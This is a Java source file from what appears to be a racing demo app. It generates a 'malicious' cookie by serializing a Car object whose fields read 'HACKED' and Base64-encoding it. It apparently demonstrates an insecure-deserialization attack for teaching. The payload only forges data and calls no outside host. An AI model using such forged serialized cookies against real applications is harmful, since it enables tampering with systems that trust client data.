package com.example.racingdemo.malicious;

import com.example.racingdemo.entities.Car;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class MaliciousCookieGenerator {
    public static void main(String[] args) throws IOException {
        // Create a malicious payload for demonstration purposes
        Car newCarPayload = new Car("HACKED","HACKED","HACKED",437L);
        String maliciousBase64Payload = serializeAndEncodePayload(newCarPayload);
        System.out.println("Malicious base64 payload: " + maliciousBase64Payload);
    }

    private static String serializeAndEncodePayload(Car payload) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(payload);
        objectOutputStream.close();
        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
    }

}
